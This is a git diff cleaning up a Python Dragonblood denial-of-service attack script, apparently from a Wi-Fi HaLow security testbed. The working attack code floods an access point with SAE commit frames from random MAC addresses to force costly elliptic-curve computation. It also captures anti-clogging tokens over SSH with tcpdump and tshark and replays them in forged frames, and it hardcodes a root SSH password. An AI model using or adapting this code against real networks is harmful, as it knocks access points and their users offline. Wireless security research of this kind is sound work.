clean up

+++ attackerDevice/attack/attacks/dragonblood.py
@@ -13,52 +13,59 @@ time_filter = f'frame.time >= "{time.time()}""'
 pcap = None
 
 stop_track = threading.Event()
-specific_frame = {}
 
 def _track_cookie():
-    global tshark, specific_frame
+    global tshark
+
+    # set to its own core for parallel execution allowing for full concurrency
     try:
         os.sched_setaffinity(0, {2})
     except:
         print("could not set to own core, check if more cores are available to be used")
         return
 
-    cmd = """
+    cmd = f"""
     sshpass -p 'halow' ssh \
     root@10.42.0.1 \
-    "tcpdump --immediate-mode -nn -l -i morse0 'type mgt and subtype auth and wlan addr2 78:72:64:ea:b9:14' -U -s0 -w - 2>/dev/null" |
+    "tcpdump --immediate-mode -nn -l -i morse0 'type mgt and subtype auth and wlan addr2 {utils.get_mac["TrustedAP"][0]}' -U -s0 -w - 2>/dev/null" |
     tshark -l -r - -Y "wlan.fixed.anti_clogging_token" \
     -T fields \
     -e wlan.sa \
     -e wlan.da \
     -e wlan.fixed.anti_clogging_token\
     """
+    try:
+        #run subprocess to open pipeline
+        tshark = subprocess.Popen(
+            cmd,
+            shell=True,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.DEVNULL,
+            bufsize = 0,
+            universal_newlines=True,
+            start_new_session=True
+        )
+        stdout = tshark.stdout
+        
+        # loop through until told to stop by main thread
+        while not stop_track.is_set():
+            # block until line is read
+            output = stdout.readline()
+            if not output:
+                continue
+            
+            #retrieve ap mac, rand mac, and cookie
+            ap_mac, rand_mac, cookie = output.strip().split("\t")
+            cookie_b = bytes.fromhex(cookie.replace(":", ""))
 
-    tshark = subprocess.Popen(
-        cmd,
-        shell=True,
-        stdout=subprocess.PIPE,
-        stderr=subprocess.DEVNULL,
-        bufsize = 0,
-        universal_newlines=True,
-        start_new_session=True
-    )
-    stdout = tshark.stdout
-    # loop through the output of stdout
-    
-    while not stop_track.is_set():
-        output = stdout.readline()
-        if not output:
-            continue
-
-        ap_mac, rand_mac, cookie = output.strip().split("\t")
-        cookie_b = bytes.fromhex(cookie.replace(":", ""))
-        if rand_mac is not None and cookie is not None:
-            frame_bytes = commit_frame(target_mac=ap_mac, src_mac=rand_mac, cookie=cookie_b, status=pwe)
-            transmitData(frame_bytes)
-
-    #terminate subprocesses
-    tshark.terminate()
+            #only transmit if mac and cookie is not none
+            if rand_mac is not None and cookie is not None:
+                frame_bytes = commit_frame(target_mac=ap_mac, src_mac=rand_mac, cookie=cookie_b, status=pwe)
+                transmitData(frame_bytes)
+    except:
+        if tshark is not None:
+            #terminate subprocesses
+            tshark.terminate()
 
 def random_mac():
     """
@@ -71,7 +78,6 @@ def random_mac():
     return ':'.join(f'{b:02x}' for b in [first] + rest)
 
 def flood_sae_commits(ap_mac:str, duration:int=600, rate:float=4, mac_no:int=10):
-    global specific_frame
     """
     Send 'count' SAE commit frames from random STA MACs to the given AP MAC.
     Each frame forces the AP to run hash-to-curve (expensive ECC operation).
@@ -83,16 +89,17 @@ def flood_sae_commits(ap_mac:str, duration:int=600, rate:float=4, mac_no:int=10)
     random_macs = [random_mac() for _ in range(mac_no)]
     i = 0
     
+    #run designated execution time
     while time.time() - start_time < duration:
+        #iterate through macs reset when limit is reached
         src = random_macs[i]
         i += 1
         if i == len(random_macs):
             i = 0
 
+        # construct and transmit frames
         frame_bytes = commit_frame(target_mac=ap_mac, src_mac=src,cookie=None, status=pwe)
         transmitData(frame_bytes)
-        if src not in specific_frame:
-            specific_frame[src] = time.time()
         time.sleep(1/rate)
         
     return int(duration/60), rate, mac_no
@@ -102,33 +109,42 @@ def start_dos(params):
         print("Invalid number of parameters for Dragonblood DoS attack.")
         return
     
+    # set global used by the token relfection
     global pwe
-    #start threading
-    print("which password derivation (PWE) do you want to target: (0 or 126)")
-    #pwe = int(input("PWE: "))
     pwe = int(params[0])
-    
-    print("which mac do you want to target (leave empty for default AP MAC): ")
-    # target = input("MAC: ")
     ap_mac = utils.get_mac("TrustedAP")[0]
 
+    # create thread
     threading.Thread(target=_track_cookie,daemon=True).start()
     time.sleep(1)
     og_interval = sys.getswitchinterval()
     sys.setswitchinterval(0.0005)
     stop_track.clear()
-
-    duration, rate, mac_no = flood_sae_commits(ap_mac=ap_mac, duration=int(params[1]), rate=float(params[2]), mac_no=int(params[3]))
-
-    sys.setswitchinterval(og_interval)
-    #stop threading
-    stop_track.set()
     try:
-        os.killpg(os.getpgid(tshark.pid), signal.SIGTERM)
-    except Exception:
-        pass
-    tshark.communicate()
+        flood_sae_commits(ap_mac=ap_mac, duration=int(params[1]), rate=float(params[2]), mac_no=int(params[3]))
 
-#    return f"sae_pwe={pwe}/dragondos_{duration}_{rate}_{mac_no}/"
+    finally:
+        # Set back original state
+        stop_track.set()
+        sys.setswitchinterval(og_interval)
+
+        #terminate subprocess
+        if 'tshark' in globals() and tshark is not None:
+            try:
+                # terminate process
+                os.killpg(os.getpgid(tshark.pid), signal.SIGTERM)
+                tshark.communicate(timeout=3)
+            except subprocess.TimeoutExpired:
+                try:
+                    # force kill
+                    os.killpg(os.getpgid(tshark.pid), signal.SIGKILL)
+                    tshark.communicate()
+                except Exception:
+                    pass
+            # process is gone
+            except (ProcessLookupError, OSError):
+                pass
+            except Exception:
+                pass
